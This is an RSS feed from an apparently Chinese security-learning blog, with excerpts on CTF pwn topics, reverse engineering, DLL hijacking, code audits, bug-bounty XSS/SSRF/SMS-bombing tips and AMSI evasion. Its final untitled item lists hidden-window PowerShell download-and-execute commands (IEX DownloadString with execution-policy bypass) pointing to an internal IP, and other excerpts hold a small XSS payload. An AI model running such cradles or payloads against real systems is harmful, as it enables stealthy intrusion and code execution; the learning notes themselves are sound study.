<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>果汁天下苏&#39;s Blog</title>
    <link>http://guozhi1.github.io/</link>
    <description>Recent content on 果汁天下苏&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-cn</language>
    <lastBuildDate>Sun, 31 Dec 2023 17:40:39 +0800</lastBuildDate><atom:link href="http://guozhi1.github.io/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>2018_rop</title>
      <link>http://guozhi1.github.io/posts/pwn/buuctf2018_rop%E8%A7%A3%E9%A2%98/</link>
      <pubDate>Sun, 31 Dec 2023 17:40:39 +0800</pubDate>
      
      <guid>http://guozhi1.github.io/posts/pwn/buuctf2018_rop%E8%A7%A3%E9%A2%98/</guid>
      <description>Libc脚本里找不到库的时候应该去这个网站https://libc.blukat.me/</description>
    </item>
    
    <item>
      <title>Ret2libc3</title>
      <link>http://guozhi1.github.io/posts/pwn/ret2libc3/</link>
      <pubDate>Tue, 19 Dec 2023 16:53:19 +0800</pubDate>
      
      <guid>http://guozhi1.github.io/posts/pwn/ret2libc3/</guid>
      <description>打libc题的时候记得使用Ubuntu 16, 使用Ubuntu 20死活打不出来！！！</description>
    </item>
    
    <item>
      <title>格式化字符串漏洞基础</title>
      <link>http://guozhi1.github.io/posts/pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/</link>
      <pubDate>Thu, 07 Dec 2023 15:35:44 +0800</pubDate>
      
      <guid>http://guozhi1.github.io/posts/pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/</guid>
      <description>格式化字符串漏洞 格式化字符串漏洞是发现比较晚的漏洞，产生的原因是因为 ，格式化函数把用户输入的格式化字符，当做了解析自身的格式化字符做了解析。 常见的格式化漏洞函数 各种print函数 格式化字符 %s 打印字符串 %p 打印地址 %c 打印char字符 %n 输入字符 %10c 这代表10个制表符（空格） printf(&amp;#34;guozhi%10s&amp;#34;, &amp;#34;格</description>
    </item>
    
    <item>
      <title>ROP中级</title>
      <link>http://guozhi1.github.io/posts/pwn/rop%E4%B8%AD%E7%BA%A7/</link>
      <pubDate>Thu, 16 Nov 2023 17:06:06 +0800</pubDate>
      
      <guid>http://guozhi1.github.io/posts/pwn/rop%E4%B8%AD%E7%BA%A7/</guid>
      <description>1. 源码分析</description>
    </item>
    
    <item>
      <title>栈溢出ret2text寻找溢出长度</title>
      <link>http://guozhi1.github.io/posts/pwn/%E6%A0%88%E6%BA%A2%E5%87%BAret2text%E5%AF%BB%E6%89%BE%E6%BA%A2%E5%87%BA%E9%95%BF%E5%BA%A6/</link>
      <pubDate>Thu, 16 Nov 2023 10:45:09 +0800</pubDate>
      
      <guid>http://guozhi1.github.io/posts/pwn/%E6%A0%88%E6%BA%A2%E5%87%BAret2text%E5%AF%BB%E6%89%BE%E6%BA%A2%E5%87%BA%E9%95%BF%E5%BA%A6/</guid>
      <description>知道有栈溢出，但是不知道填多长怎么办？</description>
    </item>
    
    <item>
      <title>ROP基础</title>
      <link>http://guozhi1.github.io/posts/pwn/rop%E5%9F%BA%E7%A1%80/</link>
      <pubDate>Wed, 15 Nov 2023 14:59:44 +0800</pubDate>
      
      <guid>http://guozhi1.github.io/posts/pwn/rop%E5%9F%BA%E7%A1%80/</guid>
      <description>如何利用栈溢出漏洞</description>
    </item>
    
    <item>
      <title>[BUUCTF]rip栈溢出解题</title>
      <link>http://guozhi1.github.io/posts/pwn/buuctfrip%E8%A7%A3%E9%A2%98/</link>
      <pubDate>Mon, 13 Nov 2023 10:20:12 +0800</pubDate>
      
      <guid>http://guozhi1.github.io/posts/pwn/buuctfrip%E8%A7%A3%E9%A2%98/</guid>
      <description>1.1 分析源码 先看下保护措施 [*] &amp;#39;/home/guozhi/桌面/pwn1&amp;#39; Arch: amd64-64-little RELRO: Partial RELRO GOT表写保护 Stack: No canary found 无金丝雀保护 NX: NX unknown - GNU_STACK missing 内存页 无不可执行保护 PIE: No PIE (0x400000) 无地址随机化 Stack: Executable 栈可执行 RWX: Has RWX segments 有可读可写可执行 int __cdecl main(int argc, const char **argv, const char **envp) { char s[15]; // [rsp+1h] [rbp-Fh] BYREF puts(&amp;#34;please input&amp;#34;); gets((__int64)s, (__int64)argv); //主要是这里产生了</description>
    </item>
    
    <item>
      <title>Pwn经典漏洞栈溢出</title>
      <link>http://guozhi1.github.io/posts/pwn/%E6%A0%88%E6%BA%A2%E5%87%BA/</link>
      <pubDate>Thu, 02 Nov 2023 16:29:23 +0800</pubDate>
      
      <guid>http://guozhi1.github.io/posts/pwn/%E6%A0%88%E6%BA%A2%E5%87%BA/</guid>
      <description>基础栈溢出</description>
    </item>
    
    <item>
      <title>Proxy代理编写</title>
      <link>http://guozhi1.github.io/posts/tech/proxy%E4%BB%A3%E7%90%86%E7%BC%96%E5%86%99/</link>
      <pubDate>Mon, 30 Oct 2023 09:38:50 +0800</pubDate>
      
      <guid>http://guozhi1.github.io/posts/tech/proxy%E4%BB%A3%E7%90%86%E7%BC%96%E5%86%99/</guid>
      <description>proxy从互联网收集代理的编写 借鉴的代码SmallProxyPool 一、代码的结构 我在分析SmallProxyPool代码之后找到了几个基础的结构用这些基础的结构就可以编写一个手机互联网代理的工具 收集模块 通过Fofa搜索到互联网上的Sockt5资产 检测模块 通过检测看什么Sock</description>
    </item>
    
    <item>
      <title>Win32调试api</title>
      <link>http://guozhi1.github.io/posts/blog/win32%E8%B0%83%E8%AF%95api/</link>
      <pubDate>Sun, 22 Oct 2023 19:13:37 +0800</pubDate>
      
      <guid>http://guozhi1.github.io/posts/blog/win32%E8%B0%83%E8%AF%95api/</guid>
      <description>Win32调试Api Win32自带了一些api函数，他们相当于调试器的大部分功能，这些函数称为Win32调试Api。 利用这些Api，可以加载一个程序或捆绑到一个正在运行的程序上以供调试。可以获得调试程序底层信息，甚至可以对被调试程序进行任意修改。 1.调试相关函数说明 BOOL ContinueDebugEvent()</description>
    </item>
    
    <item>
      <title>补丁技术</title>
      <link>http://guozhi1.github.io/posts/tech/%E8%A1%A5%E4%B8%81%E6%8A%80%E6%9C%AF/</link>
      <pubDate>Sat, 21 Oct 2023 13:03:13 +0800</pubDate>
      
      <guid>http://guozhi1.github.io/posts/tech/%E8%A1%A5%E4%B8%81%E6%8A%80%E6%9C%AF/</guid>
      <description>补丁技术 逆向工程中，经常需改更改程序的原有执行流程，使其增加或减少一些功能代码。这就需要给原有的文件添加补丁。 补丁分为两种文件补丁和内存补丁，文件补丁修改文件本身的某个数据，内存补丁是在内存中修改数据。 1.文件补丁 文件补丁直接对二进制可执行文件进行修改使其满足需求。文件补丁实现很</description>
    </item>
    
    <item>
      <title>Jwt漏洞学习</title>
      <link>http://guozhi1.github.io/posts/tech/jwt%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</link>
      <pubDate>Tue, 17 Oct 2023 10:43:05 +0800</pubDate>
      
      <guid>http://guozhi1.github.io/posts/tech/jwt%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</guid>
      <description>知识文献 1.JWT介绍 jwt是一种用于身份验证和授权的开放标准,通过网络应用间的传递加密的json。jwt的攻击途径有例如：特权升级、信息泄露、sqli , xss, ssrf,rce, LFI等。 2.基础概念 JWS: singed jwt 签名过的jwt JWK: JWT的密钥，常说的的SECRET JWE: encrypted JWT的部分payload经过加密的JW</description>
    </item>
    
    <item>
      <title>二次开发</title>
      <link>http://guozhi1.github.io/posts/tech/%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/</link>
      <pubDate>Thu, 12 Oct 2023 14:29:40 +0800</pubDate>
      
      <guid>http://guozhi1.github.io/posts/tech/%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/</guid>
      <description>1.数据对齐 数据对齐cpu的结构一部分, 对齐可以提升执行效率，当数据大小的数据模数的内存地址是0的时候，数据是对齐的。例如 word值总是能被2除尽的地方开始，而dword值总是被4除尽的地方开始， x86可以对未对其的数据进行调整，但是代价是cpu的资源。 在windows中</description>
    </item>
    
    <item>
      <title>Hook技术</title>
      <link>http://guozhi1.github.io/posts/tech/hook%E6%8A%80%E6%9C%AF/</link>
      <pubDate>Wed, 11 Oct 2023 17:02:48 +0800</pubDate>
      
      <guid>http://guozhi1.github.io/posts/tech/hook%E6%8A%80%E6%9C%AF/</guid>
      <description>1. Hook技术 hook的手段就是“钩住”关心的程序流并 并根据需要进行干预的动作 1.1 IAT HOOK篡改MessageBox消息</description>
    </item>
    
    <item>
      <title>DLL劫持技术</title>
      <link>http://guozhi1.github.io/posts/tech/dll%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF/</link>
      <pubDate>Mon, 11 Sep 2023 14:46:30 +0800</pubDate>
      
      <guid>http://guozhi1.github.io/posts/tech/dll%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF/</guid>
      <description>DLL劫持技术 1、介绍 DLL劫持技术是一种权限维持的手段， 通过劫持正常程序DLL的执行流让程序执行恶意代码。 流程 正常程序 &amp;mdash;-调用&amp;mdash;-&amp;raquo; 正常的DLL &amp;mdash;-执行&amp;mdash;&amp;raquo; 正常功能 DLL劫持就可以通过劫持正常的DLL, 让恶</description>
    </item>
    
    <item>
      <title>Java代码审计jspxcms</title>
      <link>http://guozhi1.github.io/posts/read/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1jspxcms/</link>
      <pubDate>Fri, 14 Jul 2023 11:10:58 +0800</pubDate>
      
      <guid>http://guozhi1.github.io/posts/read/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1jspxcms/</guid>
      <description></description>
    </item>
    
    <item>
      <title>PE文件格式</title>
      <link>http://guozhi1.github.io/posts/blog/pe%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/</link>
      <pubDate>Thu, 13 Jul 2023 18:13:18 +0800</pubDate>
      
      <guid>http://guozhi1.github.io/posts/blog/pe%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/</guid>
      <description>知识来源:《加密与解密》</description>
    </item>
    
    <item>
      <title>键盘HOOK学习以及逆向</title>
      <link>http://guozhi1.github.io/posts/blog/hook%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E9%80%86%E5%90%91/</link>
      <pubDate>Thu, 29 Jun 2023 15:25:38 +0800</pubDate>
      
      <guid>http://guozhi1.github.io/posts/blog/hook%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E9%80%86%E5%90%91/</guid>
      <description>一、WidnowsHOOK分类 系统钩子（System Hooks）：系统钩子是最常见的一类钩子，用于监视和修改系统级别的事件。系统钩子可以捕获和处理各种系统事件，如键盘输入、鼠标消息、窗口消息等。系统钩子可以全局范围内生效，可以对整个系统中的事件进行拦截和处理。 应用程序钩子（App</description>
    </item>
    
    <item>
      <title>Src未授权访问挖掘</title>
      <link>http://guozhi1.github.io/posts/tech/src%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%8C%96%E6%8E%98/</link>
      <pubDate>Fri, 02 Jun 2023 17:48:15 +0800</pubDate>
      
      <guid>http://guozhi1.github.io/posts/tech/src%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%8C%96%E6%8E%98/</guid>
      <description>可以正常使用的功能点截取数据包，删除cookie看对业务是否能正常处理，如果处理就是未授权。 可以f12查看前端页面是否存在未授权的API接口 修改返回包</description>
    </item>
    
    <item>
      <title>X64逆向技术 笔记</title>
      <link>http://guozhi1.github.io/posts/blog/x64%E9%80%86%E5%90%91%E6%8A%80%E6%9C%AF-%E7%AC%94%E8%AE%B0/</link>
      <pubDate>Thu, 25 May 2023 07:47:04 +0800</pubDate>
      
      <guid>http://guozhi1.github.io/posts/blog/x64%E9%80%86%E5%90%91%E6%8A%80%E6%9C%AF-%E7%AC%94%E8%AE%B0/</guid>
      <description>x64逆向技术 1. 寄存器 64位寄存大小扩展64位，数量增加8个（R8-R15）,扩充8个128位的xmm寄存器， 64位兼容32应用程序，64程序用rax, 32位程序用eax底32位， x64高位访问通过WORD byte DWORD来进行访问。 1.1 函数 栈平衡 栈的特征是先进后出，RSP是栈顶指针，</description>
    </item>
    
    <item>
      <title>Oasys代码审计</title>
      <link>http://guozhi1.github.io/posts/read/oasys%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</link>
      <pubDate>Mon, 22 May 2023 15:54:16 +0800</pubDate>
      
      <guid>http://guozhi1.github.io/posts/read/oasys%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</guid>
      <description>OAsys代码审计 知识来源 1. sql注入 全局搜索可以注入的地方${可以找到sql注入的地方。#{}是预编译不可以进行注入的。 做了一个简单的判断然后进行拼接操作。 这个语句的id是sortMyNotice（我没截进去） 然后在这个所属的类 在cn.gson.oasys.mappers这个包</description>
    </item>
    
    <item>
      <title>Java代码审计smbms</title>
      <link>http://guozhi1.github.io/posts/read/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1smbms/</link>
      <pubDate>Sun, 14 May 2023 16:56:09 +0800</pubDate>
      
      <guid>http://guozhi1.github.io/posts/read/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1smbms/</guid>
      <description>SMBMS代码审计 1. xss漏洞 先知社区-知识来源 这个xss在head.jsp文件的标签里，获取了请求头的Referer参数在前端显示了 可以使用payload进行闭合操作，进行闭合操作 &amp;#34;&amp;gt;&amp;lt;img src=x onerror=alert(1)&amp;gt; 这个payload在应该经过过滤器的时候就被拦截，因为jsp的本质是servlet所以是经过</description>
    </item>
    
    <item>
      <title>Src挖掘 Xss漏洞</title>
      <link>http://guozhi1.github.io/posts/tech/src%E6%8C%96%E6%8E%98-xss%E6%BC%8F%E6%B4%9E/</link>
      <pubDate>Tue, 09 May 2023 08:35:41 +0800</pubDate>
      
      <guid>http://guozhi1.github.io/posts/tech/src%E6%8C%96%E6%8E%98-xss%E6%BC%8F%E6%B4%9E/</guid>
      <description>src挖掘-xss漏洞 漏洞点：url跳转参数，登录url跳转， 退出 注意点：注意url参数 redirect URL redirect_url等参数 前端302跳转可造成xss漏洞window.location 正常的url:https://guozhi1.github.io/login?url=http:/</description>
    </item>
    
    <item>
      <title>Src挖掘 短信邮箱轰炸</title>
      <link>http://guozhi1.github.io/posts/tech/src%E6%8C%96%E6%8E%98-%E7%9F%AD%E4%BF%A1%E9%82%AE%E7%AE%B1%E8%BD%B0%E7%82%B8/</link>
      <pubDate>Tue, 09 May 2023 08:14:15 +0800</pubDate>
      
      <guid>http://guozhi1.github.io/posts/tech/src%E6%8C%96%E6%8E%98-%E7%9F%AD%E4%BF%A1%E9%82%AE%E7%AE%B1%E8%BD%B0%E7%82%B8/</guid>
      <description>src挖掘-短信邮箱轰炸 漏洞点：有手机号， 邮箱发送东西的地方 有的轰炸只有前端限制，可以通过burp抓包进行重发测试 有些会有后端的时间限制如后端10秒，前端60秒，我们只需要关注后端10秒时间一到立马发包 并发轰炸在一定时间内，发送数据包可以被服务器受理，只要在这个时间内多次发包就可</description>
    </item>
    
    <item>
      <title>Src挖掘 Pdf导出导致的ssrf漏洞</title>
      <link>http://guozhi1.github.io/posts/tech/src%E6%8C%96%E6%8E%98-pdf%E5%AF%BC%E5%87%BA%E5%AF%BC%E8%87%B4%E7%9A%84ssrf%E6%BC%8F%E6%B4%9E/</link>
      <pubDate>Tue, 09 May 2023 07:33:40 +0800</pubDate>
      
      <guid>http://guozhi1.github.io/posts/tech/src%E6%8C%96%E6%8E%98-pdf%E5%AF%BC%E5%87%BA%E5%AF%BC%E8%87%B4%E7%9A%84ssrf%E6%BC%8F%E6%B4%9E/</guid>
      <description>src挖掘-pdf导出导致的ssrf 漏洞点：pdf导出 在测试pdf导出导致的ssrf有两个方法 burp抓包进行插入标签 通过js断点调试控制台使用插入 变量=变量.replaceAll(&amp;#34;被替换的值&amp;#34;， &amp;#34;&amp;lt;iframe src=&amp;#34;http://dnslog&amp;#34;&amp;gt;&amp;#34;); 如果是全回显就会返回对应的网址，不是全回显需要注意网页延迟或者</description>
    </item>
    
    <item>
      <title>32位逆向技术</title>
      <link>http://guozhi1.github.io/posts/blog/32%E4%BD%8D%E9%80%86%E5%90%91%E6%8A%80%E6%9C%AF/</link>
      <pubDate>Sat, 15 Apr 2023 15:02:44 +0800</pubDate>
      
      <guid>http://guozhi1.github.io/posts/blog/32%E4%BD%8D%E9%80%86%E5%90%91%E6%8A%80%E6%9C%AF/</guid>
      <description>前言 知识来源：《加密与解密》 第一章启动函数 Windows程序在按顺序执行时不是直接从WinMain函数开始的,而是执行别的函数进行初始化,之后调用WinMain函数 （选择WinMain,交叉引用就可以找到上一级） 第二章函数 1. 识别函数 编译器都会使用call与ret指令来进行函数的调</description>
    </item>
    
    <item>
      <title>逆向基础-调用约定</title>
      <link>http://guozhi1.github.io/posts/blog/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/</link>
      <pubDate>Tue, 11 Apr 2023 12:08:52 +0800</pubDate>
      
      <guid>http://guozhi1.github.io/posts/blog/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/</guid>
      <description>调用约定 知识来源 允许使用VARARG：表示参数个数可以是不确定 约定类型 _cdecl(C类规范) pascal stdcall Fastcall 参数传递 从右到左 从左到右 从右到左 寄存器传参与栈 平衡者 调用者 子程序 子程序 子程序 允许使用VARARG 是 否 否 x86 下的调用约定 _cdecl,_stdcall,_fastcall int Test(int a,int b,int c,int d,int e) { return a + b + c + d + e; } int main() { Test(1,2,3,4,5); } _cdecl C++下的默</description>
    </item>
    
    <item>
      <title>文本类型免杀</title>
      <link>http://guozhi1.github.io/posts/tech/%E6%96%87%E6%9C%AC%E7%B1%BB%E5%9E%8B%E5%85%8D%E6%9D%80/</link>
      <pubDate>Tue, 11 Apr 2023 10:41:37 +0800</pubDate>
      
      <guid>http://guozhi1.github.io/posts/tech/%E6%96%87%E6%9C%AC%E7%B1%BB%E5%9E%8B%E5%85%8D%E6%9D%80/</guid>
      <description>AMSI 一个反病毒接口，分析恶意代码。 位置是在C:\windows\system32\amsi.dll 安全厂商也可以通过接入Amsi进行查杀提高安全性 接入Amsi的相关厂商 AMSI的处理流程是：扫描&amp;mdash;-触发&amp;mdash;-病毒库 ASMI绕过方式 不进行绕过，的显示 PS C:\Users\32569&amp;gt; amsiutils 所在位</description>
    </item>
    
    <item>
      <title>🤝友链</title>
      <link>http://guozhi1.github.io/links/</link>
      <pubDate>Sat, 06 Nov 2021 15:15:53 +0800</pubDate>
      
      <guid>http://guozhi1.github.io/links/</guid>
      <description>Sulv&amp;#39;s Blog 一个记录技术、阅读、生活的博客(源码来源大佬) 小白工具箱chargpt 非常好用的工具站 知识星球（免费） 做网络安全知识汇总 小白工具箱github镜像 非常好用的工具站 棱角安全社区 安全社区</description>
    </item>
    
    <item>
      <title>🙋🏻‍♂️关于</title>
      <link>http://guozhi1.github.io/about/</link>
      <pubDate>Sat, 06 Nov 2021 14:57:28 +0800</pubDate>
      
      <guid>http://guozhi1.github.io/about/</guid>
      <description>关于我 qq:3256906644@qq.com 无特长方面仅限于略懂</description>
    </item>
    
    <item>
      <title></title>
      <link>http://guozhi1.github.io/posts/pwn/buuctfbjdctf_2020_babystack%E8%A7%A3%E9%A2%98/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://guozhi1.github.io/posts/pwn/buuctfbjdctf_2020_babystack%E8%A7%A3%E9%A2%98/</guid>
      <description>echo curl -o 1.ps1 http://172.16.32.67:8000/1.ps1 &amp;gt; 1.bat 运行powershell 脚本 powershell -WindowStyle hidden -exec bypass -file 1.ps1 set scriptblock &amp;lsquo;powershell -WindowStyle Hidden -Command &amp;ldquo;IEX (New-Object Net.WebClient).DownloadString(&amp;lsquo;http://172.16.32.67:8000/1.ps1&amp;rsquo;)&amp;rdquo;&amp;rsquo; set scriptblock &amp;lsquo;powershell -WindowStyle Hidden -Command &amp;ldquo;wget &amp;ldquo;&amp;rsquo; 下载并执行 IEX (New-Object Net.WebClient).DownloadString(&amp;lsquo;http://172.16.32.67:8000/1.ps1&amp;rsquo;) 无窗口执行 powershell -WindowStyle Hidden -Command &amp;ldquo;IEX (New-Object Net.WebClient).DownloadString(&amp;lsquo;http://172.16.32.67:8000/1.ps1&amp;rsquo;)&amp;rdquo; powershell -WindowStyle Hidden -Command &amp;ldquo;IEX (New-Object Net.WebClient).DownloadString(&amp;lsquo;http://172.16.32.67:8000/1.ps1&amp;rsquo;)&amp;rdquo; 一、总体工作内容 参与中国移动安全运营建设，完成中国移动网络安全保障，进行中国移动攻防演练值守，对甲方内外网业务系统建设安全屏障。 二、今日</description>
    </item>
    
    
    
  </channel>
</rss>
